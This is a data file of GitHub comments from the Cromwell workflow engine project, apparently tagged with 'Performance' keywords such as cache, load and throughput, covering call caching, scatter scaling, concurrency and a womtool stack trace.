Performance,@cjllanwarne I'm using multiple PRs to increase the throughput of data gathering.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208:52,throughput,throughput,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208,1,['throughput'],['throughput']
Performance,"@cjllanwarne Not sure if this is related (tell me if I should file another issue), but all jobs should be cache hits. Yet, I can see that it is running jobs. This may be due to the ""path"" hashing strategy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703:106,cache,cache,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703,1,['cache'],['cache']
Performance,"@cjllanwarne Something went wrong with the latest release of the womtool.; The cromwell.jar does properly display the CLI usage when run.; ```; $ java -jar womtool-53.jar ; Exception in thread ""main"" java.lang.NoClassDefFoundError: scala/concurrent/duration/Duration; 	at scopt.Read$.liftedTree1$1(options.scala:67); 	at scopt.Read$.<init>(options.scala:66); 	at scopt.Read$.<clinit>(options.scala); 	at womtool.cmdline.WomtoolCommandLineParser.<init>(WomtoolCommandLineParser.scala:30); 	at womtool.cmdline.WomtoolCommandLineParser$.instance$lzycompute(WomtoolCommandLineParser.scala:13); 	at womtool.cmdline.WomtoolCommandLineParser$.instance(WomtoolCommandLineParser.scala:13); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:158); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); 	at scala.Function0.apply$mcV$sp(Function0.scala:39); 	at scala.Function0.apply$mcV$sp$(Function0.scala:39); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); 	at scala.App.$anonfun$main$1$adapted(App.scala:80); 	at scala.collection.immutable.List.foreach(List.scala:392); 	at scala.App.main(App.scala:80); 	at scala.App.main$(App.scala:78); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:27); 	at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: java.lang.ClassNotFoundException: scala.concurrent.duration.Duration; 	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:581); 	at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:178); 	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522); 	... 18 more; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5808:238,concurren,concurrent,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5808,7,"['concurren', 'load']","['concurrent', 'loadClass', 'loader']"
Performance,"@cjllanwarne Thanks for notifying! We always use the `docker` attribute in BioWDL, so BioWDL pipelines can run without any extra configuration. On our cluster we have configured this so that we run the docker images using singularity. . I think it is a good thing that custom runtime attributes can be cached now. We recently added a `time_minutes` attribute to our pipelines in order to work better with SLURM. I hope this code ties in nicely when we switch to `hints` in WDL 2.0.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996:302,cache,cached,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996,1,['cache'],['cached']
Performance,"@cjllanwarne There's nothing stopping you from submitting a future PR proposing the changes you describe. @kshakir Don't forget about akka streams, which sit in between futures and actors on the generalized concurrency spectrum. . I recognized the URL of that blog post, I'll say that it has surprisingly useful comments at the end as well. Personally I find it a lot easier to reason about actors & messages than futures but that's not true for everyone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226577404:207,concurren,concurrency,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226577404,1,['concurren'],['concurrency']
Performance,"@cjllanwarne Unfortunately it looks like this is a separate issue. I tried running it with the file-path hashing method: When I ran it with a wide scatter (312) it hangs before it starts any tasks in the scatter. When I ran it with a small scatter (6) it ""starts"" the jobs inside the scatter but the timing diagram just says `QueuedInCromwell` for all of them. It might not be the fact that there are declarations inside of the scatter, but the fact that those declarations include declaring multiple files, which all happen at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222:326,Queue,QueuedInCromwell,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222,1,['Queue'],['QueuedInCromwell']
Performance,"@cjllanwarne Yes, but for example Workflow store has a dependency on WorkflowStoreSqlDatabase trait, so that means you can not use a NoSQLDatabase impl.; In order to allow WorkflowStore to do that you will need to implement a generic interface to work with different specializations of dbs and for that you will need to define a DAL and perform a bigger refactoring.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563:337,perform,perform,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563,1,['perform'],['perform']
Performance,"@cjllanwarne You asked at standup what I was asking for when I asked about how it handles load. What I meant was if you submit stuff such that there are at least in the range of several thousand runs & status polls happening (ideally interspersed as well, not just a bunch of runs followed by a bunch of statuses) does something terrible happen? . IOW a week from now when thousands of things are flowing through via FC is there some obvious gotcha that we could have spotted now to save us some pain.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282397582:90,load,load,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282397582,1,['load'],['load']
Performance,@cjllanwarne application.conf should only include things which the most brain dead usage pattern straight out of the box would pick up. Everything else belongs in a separate conf file loaded at runtime.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159059478:184,load,loaded,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159059478,1,['load'],['loaded']
Performance,"@cjllanwarne regarding testing the ""write to cache"" and ""read from cache""... that feature isn't available to this code, it's on another PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332:45,cache,cache,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332,2,['cache'],['cache']
Performance,"@cjllanwarne the reason was that `WdlNamespace.load` was throwing an `ValidationException` which unfortunately is a `Throwable` but not an `Exception`, which is why there's also a PR in lenthall to make `AggregatedException` an `Exception`... I can't find a `missing_import` test in centaur though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572:47,load,load,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572,1,['load'],['load']
Performance,"@cjllanwarne yep ! 😄 That was an earlier run I've been trying to improve PAPI throughput but it's one of the highest ""load generators"" for now",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370929227:78,throughput,throughput,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370929227,2,"['load', 'throughput']","['load', 'throughput']"
Performance,"@cjllanwarne yes, comments were hidden due to file name change.; Ans 1. Adding hidden comment I did: Caching functionality is missing here. Shouldn't each backend implement caching and when engine ask for a jobExecutor, backend may return BackendCachedJobExecutor?; Doing that we can get rid of the engine responsibility to deal with cached data...; IMO, Cache should be encapsulated in each backend. The only thing I'm not sure if we should expose a standard message to force not to use cached data. So with that you tell to each backend to not use cached data but instead to process data again.; Ans 2. I'm not seeing any new msg for WorkflowBackendActor right now. That will depend on the UCs... for CCC backend those msgs are OK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495:334,cache,cached,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495,4,"['Cache', 'cache']","['Cache', 'cached']"
Performance,@cmarkello. I believe the metadata also shows the data it uses to evaluate whether a cache entry is the same. This can be used for debugging I believe.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-590205206:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-590205206,1,['cache'],['cache']
Performance,"@danbills I think I'm actually changing my mind and leaning towards doing the try/retry instead:; 1) It seems generally more robust to be able to fallback to that (compared to caching where if we can't get the info or we get it wrong we'd fail workflows); 2) Talking to @kshakir, things seem to be moving towards more generic implementations of filesystems. The retry logic could be lifted up to the generic implementation whenever it happens (which might be harder to do with a caching logic); 3) We can always add caching later if we see Cromwell struggling too much; 4) Unlike what I was thinking first, it actually simplifies the code a little and even more testing (testing that things get cached properly and for the right amount of time is a pain). Thoughts ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929:695,cache,cached,695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929,2,['cache'],['cached']
Performance,@delocalizer Yeah we changed this a while back to help w/ submission performance under load. Those synchronous checks were really bogging things downl.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1515#issuecomment-279579962:69,perform,performance,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1515#issuecomment-279579962,2,"['load', 'perform']","['load', 'performance']"
Performance,"@dheiman for what it's worth, ""why a call was cached"" is very conservative, so you can be assured that yes, your file's hash exactly matched the old input. As indeed did every other input value, the command string, the relevant workflow and runtime options, and the docker image specified. If anything wasn't the same, Cromwell wouldn't have used the cached result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210:46,cache,cached,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210,2,['cache'],['cached']
Performance,"@dtenenba - the space on the scratch mount point (for cromwell it is `/cormwell_root`) is managed by a monitoring tool `ebs-autoscale` that is installed when creating a custom AMI configured for Cromwell, and then referencing that AMI when creating Batch compute environments. Running out of space points to one or more of the following:. * the monitor is not installed; * the monitor is looking at the wrong location in the filesystem. If you've created a custom AMI, I suggest launching an instance with it and checking that the monitor is watching the correct location. Do this by checking the log: `/var/log/ebs-autoscale.log`. If it's not, you'll need to recreate both the AMI and the Batch Compute Environment, and associate the new CE with your Job Queue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942:756,Queue,Queue,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942,1,['Queue'],['Queue']
Performance,"@ffinfo Hi Peter - apologies for taking so long, the release I mentioned ended up taking a while longer than we thought. I talked to our PO this morning about this pull request and his take was that if this could be hooked up in a way which keeps the tests green (as much as they ever are) and doesn't add noticeable latency in the system for other users (and/or the behavior change is put behind a config option) that he'd be good with this concept. . It's been a month now so it's entirely possible you've already moved on with life or perhaps you have no interest for other reasons so I'll leave it up to you on how to proceed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442:317,latency,latency,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442,1,['latency'],['latency']
Performance,"@francares Ah! I see. Yeah, I asked because I wasn't sure why we'd need another command type, we could either make a different type of ExecutorActor or have a branch in the existing ExecutorActor for caches. So we agree there. As for another message type, I believe this is all configured in (a) global config file and (b) workflow options so the actors should already have everything they need to decide whether to allow caching or not. So IMO there's no special case at this layer to handle caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492:200,cache,caches,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492,1,['cache'],['caches']
Performance,"@francares Can you provide more details on what you're actually doing? Cromwell as-is isn't intended to be scaled like that, at least not at the moment. Also the current metadata implementation isn't expected to be a heavy hitting, scalable solution (e.g. we'll be providing at least one alternate implementation over the next couple of months for a more scalable use case)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-315474312:232,scalab,scalable,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-315474312,2,['scalab'],['scalable']
Performance,"@francares are you seeing a stack overflow exception or a Slick ""task rejected from queue"" exception?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315446494:84,queue,queue,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315446494,1,['queue'],['queue']
Performance,"@gauravs90 @geoffjentry ; Re JES Backend - there's a _lot_ of hidden complexity in the JES backend that I think could quite easily end up being more than 5 days work to re-implement under another workflow runner. We currently have a Master branch which lets us run hundreds of Genomes-on-the-Cloud jobs concurrently in JES. If this merge goes ahead before the JES backend is made (and is as robust as it currently exists), we LOSE that ability. I don't think we should underestimate this task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174213137:303,concurren,concurrently,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174213137,1,['concurren'],['concurrently']
Performance,@gauravs90 including the bottom row is an optimization once/if the original actor is overloaded. The right optimization at that point might not be what we think it is now - but it'll be trivial to change on the future as clients of this actor were talking about can continue to use the same actor ref without being any the wiser,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196430491:42,optimiz,optimization,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196430491,2,['optimiz'],['optimization']
Performance,"@geoffjentry -- to put this in your head. Let's not jump to it being an engine feature. But I think the point here is a good one. . I think this, and other use cases, might be best met by a set of ""built-in"" tasks that cromwell could come with. For example, through the use of imports and having cromwell released with a equivalent of ""genomics-stdlib"" we could provide genomics specific manipulations as tasks. This solves the problem of the user having to write them themselves. Then through the use of smart multi-backend support we could also have some of these stdlib tasks run on the same machine as cromwell. This requires a bunch of advances to the engine, but I think it's where we can provide a lot of value to the users. The first step in this could be having Kate & Crew (along with our help) publish that ""gatk-stdlib.wdl"" that performs these functions and people could import. Then if that is successful we could see how we would best provide that sort of support in a batteries included fashion.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1605#issuecomment-255404918:841,perform,performs,841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1605#issuecomment-255404918,1,['perform'],['performs']
Performance,"@geoffjentry ; **Prerequisite**: We have Spark cluster (3 nodes = 1 master, rest worker including master), Docker on all three nodes, Hdfs file system (3 nodes = 1 Namenode, rest Data nodes including NN) Spark app build locally in Docker repository. This app (spark_hdfs.jar) has two main entry points 1) Word count 2) Vowel count as main class. App consumes input available on Hdfs (assumption pre-loaded) and produces output to Hdfs. . **WDL:**. ```; task spark {; command {; /opt/spark/spark-1.6.1-bin-hadoop2.6/bin/spark-submit --class com.intel.spark.poc.nfs.SparkVowelLine --master spark://10.0.1.22:7077 /app/spark_hdfs.jar hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output; }. output {; File empty = stdout(); }. runtime {; docker: ""sparkapp""; }. }. workflow test {; call spark; }. ```. So the app is available inside the docker container that has base image with Spark environment(i.e. Spark driver + hadoop connector) that will connect to Spark master on host machine within the cluster to submit job, reads input from hdfs file system and turn them into RDDs and distribute the work to workers with the help of master and at the end write output to hdfs. . Following are the arguments to the app ; `hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660:399,load,loaded,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660,1,['load'],['loaded']
Performance,"@geoffjentry ; I'm using SGE as backend and a MariaDB database. Running cromwell inside a docker container.; Call-caching is ON, I've got a concurrent job limit of 100, and a slightly customised job script epilogue. The rest of the cromwell config is standard as in the docs.; Anything other relevant info that I could provide?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570:140,concurren,concurrent,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570,1,['concurren'],['concurrent']
Performance,@geoffjentry @scottfrazer It seems the parser is validating memory runtime attribute entry when it tries to load namespaces.; I think it should be removed to follow the current idea.; This is the link to the code that is causing related test to fail (look for ignore word in the PR) => https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/RuntimeAttributes.scala; Let me know how to proceed with this...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369:108,load,load,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369,1,['load'],['load']
Performance,"@geoffjentry Absolutely no worries, I totally understand but it is a bit weird to be aware of the concepts behind the following fault-tolerant scalable analysis pipelines and other distributed algorithms - which I'm sure you and many people are - and still be noticing that you have to deal with [20000 scatter/gather jobs](https://github.com/broadinstitute/cromwell/issues/1662) that might be causing issues when producing 10% of the world's genomic data:; - [Google's Continuous Pipelines](http://research.google.com/pubs/pub43790.html); - [Facebook's Real-Time Data Processing Pipelines](https://research.facebook.com/publications/realtime-data-processing-at-facebook/); - [Microsoft's Whole-Exome Workflows](https://www.microsoft.com/en-us/research/publication/scalable-and-efficient-whole-exome-data-processing-using-workflows-on-the-cloud/). Maybe it's my passion for high-throughput data integration, and knowing the potential of pipelined analysis that is achievable today through streamlined fault-tolerant scaling. I'm sure the Broad is already aware of these, as some of the fundamental scalability concepts have and are being implemented in [Hail](https://github.com/hail-is/hail). At least I'm comforted that you watch all the suggestions, and maybe in the future this might provide some helpful support :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261687956:143,scalab,scalable,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261687956,4,"['scalab', 'throughput']","['scalability', 'scalable', 'scalable-and-efficient-whole-exome-data-processing-using-workflows-on-the-cloud', 'throughput']"
Performance,"@geoffjentry I ran this wdl on local backend, call caching off, and I mocked the backend response to immediately return success instead of running the job. So all jobs finish immediately and at the same time. It's not a realistic use case but it's an easy way to push cromwell hard in terms of execution performance for large scatter. ```; task hello {; String addressee; command {; echo ""Hello ${addressee}!""; }; runtime {; docker: ""ubuntu""; }; }. workflow wf_hello {; String wf_hello_input = ""world""; Array[Int] s = range(200000); scatter (i in s) {; call hello {input: addressee = wf_hello_input }; }; }; ```. Here are the results:. | Branch | JobStore Writes | ExecutionTime |; |------------|-----------------|-------------------------------------------------------------|; | Develop | On | Still computing runnable calls after 30' - no shard started |; | ThisBranch | On | 8' |; | ThisBranch | Off | 1'30"" |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274:304,perform,performance,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274,1,['perform'],['performance']
Performance,@geoffjentry I totally agree with @rtitle that this is something that should be added to next FC release as the performance improvement is significant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2485#issuecomment-317803184:112,perform,performance,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2485#issuecomment-317803184,1,['perform'],['performance']
Performance,"@geoffjentry I totally agree with having a singleton actor for load balancing / supervision / monitoring etc.. but I think the actual validation work itself is better handled by a one-shot do-and-die actor than by a singleton actor. I don't think the actor that is responsible for load balancing, error handling etc.. should also be responsible for doing the work it's supervising.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589:63,load,load,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589,2,['load'],['load']
Performance,"@geoffjentry I understand re: egress charges. In my use case these aren't an issue, so a flag option would still help. Maybe, make egress cost a config option of a filesystem, and only reuse results if the egress cost would be under some user-specified value? You can also drop the requirement of specifying one engine/filesystem for all tasks. You could then return a cached result from any filesystem where it exists, without needing to copy it to a target filesystem. You could then also let workflow inputs point to files on different filesystems, and automatically choose the engine for each job based on where its inputs are.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286:369,cache,cached,369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286,1,['cache'],['cached']
Performance,"@geoffjentry Is this at the time of running the workflow, or after the fact (like #1670)?. As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **avoid reusing bad or old cache results**. ; - Effort: **Small**; - Risk: **Small to Mediume**; - This should not be a runtime attribute; - Make sure users don't overuse this feature and eliminate the benefits of call caching (i.e. clearly state when users should use this); - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586:169,cache,cache,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586,6,['cache'],['cache']
Performance,"@geoffjentry It wasn't yet, AFAIK you need a branch to test stuff on the perf env so I thought I'd make a PR of it already and test it in the meantime. We could also leave the current value of 100 and merge this which would have no change in behavior and then tune the value if necessary with benchmarks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111:260,tune,tune,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111,1,['tune'],['tune']
Performance,"@geoffjentry This is my github ID. :). @katevoss We've been using parameters to tasks to override runtime attributes. However, I am not sure how this affects call caching, it is very clunky, and the standard names my group uses may different from another. This lattermost is a headache for pipeline engineers. Anyway, it would be nice to have a mechanism for overriding runtime attributes, mostly for users, not developers. This would cover times where WDL writers have hardcoded runtime attributes that do not fit a user's need. For me, this is no longer high priority... . Though is another issue needed for these parameters that I use adversely affecting call caching (e.g. my `preemptible_attempts` parameter is only used in the runtime block and should not cause a cache miss if it is changed)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325718645:770,cache,cache,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325718645,1,['cache'],['cache']
Performance,@geoffjentry We came to the conclusion that my earlier change did not cause the performance issue. I will make a new issue for this performence. Still this code I made here is useful to merge and is ready to review/merge.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-429845193:80,perform,performance,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-429845193,2,['perform'],"['performance', 'performence']"
Performance,@geoffjentry Within the workflow actor? I don't know how concurrent the tests are but they aren't crazy - I can imagine a scatter going wider than our test cases,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224:57,concurren,concurrent,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224,1,['concurren'],['concurrent']
Performance,"@geoffjentry Yeah, I have also hit my share of obscure errors over time in my applications, though by that time the failure-recovery rules usually kicked in to keep the system in a running state, with the periodic subsequent log monitoring and analysis in case certain edge-cases become more prevalent. It is great to hear about the shift towards scaling being explored for the near future, but I think you might have made things unnecessarily hard for yourself. Usually it is much easier to have scaling be built-in from the start into the application, and then tuning through metric-based scaling policies the application-triggered scaling rules, which can be bounded by appropriate upper limits before, or interactively after application deployment. This way one has the benefits of both worlds - controlling costs with scalability capabilities for satisfying possible capacity/performance requirements - but I am sure you are already aware of that as well :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235:823,scalab,scalability,823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,@geoffjentry and @aednichols regarding documentation I added this: https://github.com/broadinstitute/cromwell/blob/cjl_nio_meta/docs/optimizations/FileLocalization.md. Is that sufficient of is there more to be said?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395518160:133,optimiz,optimizations,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395518160,1,['optimiz'],['optimizations']
Performance,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:1492,cache,cache,1492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,4,['cache'],"['cache', 'cache-miss']"
Performance,"@geoffjentry commented on [Tue Apr 26 2016](https://github.com/broadinstitute/centaur/issues/36). Initially Centaur loaded in its files for each test (wdl, inputs, etc) using a function which would throw an exception if it wasn't there. As the framework has evolved it has moved to a model that is more robust and would more accurately report what was going on there. Modify these file slurps to play nicer with the rest of the system",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2885:116,load,loaded,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2885,1,['load'],['loaded']
Performance,@geoffjentry does this mean that users can choose to link to the results rather than copy the results when they get a cache hit?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-375766475:118,cache,cache,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-375766475,1,['cache'],['cache']
Performance,@geoffjentry have you continued to see many logs as drowning performance? It sounds like optimizing logs could give us a large bump in scale!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648:61,perform,performance,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648,2,"['optimiz', 'perform']","['optimizing', 'performance']"
Performance,@geoffjentry is it possible to call cache when the original input no longer exists? ; @dheiman have you looked at the [call cache diff endpoint](https://github.com/broadinstitute/cromwell#get-apiworkflowsversioncallcachingdiff)? This is not available in FireCloud but it may have more information about why a workflow cached (or did not).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335536210:36,cache,cache,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335536210,3,['cache'],"['cache', 'cached']"
